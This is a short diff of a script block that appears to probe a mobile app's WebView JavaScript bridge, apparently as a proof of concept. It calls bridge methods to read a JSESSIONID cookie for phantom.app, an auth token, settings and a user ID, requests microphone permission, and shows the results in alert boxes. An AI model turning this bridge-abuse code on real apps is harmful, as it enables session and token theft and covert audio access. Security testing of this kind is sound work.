@@ -16,10 +16,10 @@
 		alert(JAVASCRIPT_INTERFACE.getCookie('https://phantom.app/','JSESSIONID'));
 		JAVASCRIPT_INTERFACE.requestNativePermission("android.permission.RECORD_AUDIO");
 		permissionRequest.getResources("android.permission.RECORD_AUDIO");  
-		JAVASCRIPT_INTERFACE.permissionRequest("android.permission.RECORD_AUDIO");  
+		ReactNativeWebView.permissionRequest("android.permission.RECORD_AUDIO");  
 		alert(JAVASCRIPT_INTERFACE.getUniqueAuthToken());
-		alert(JAVASCRIPT_INTERFACE.getsettings());
-		alert(JAVASCRIPT_INTERFACE.getUserId());
+		alert(ReactNativeWebView.getsettings());
+		alert(ReactNativeWebView.getUserId());
 		alert(JAVASCRIPT_INTERFACE.getUserId());
 		alert(JAVASCRIPT_INTERFACE.getUserId());
 	</script>
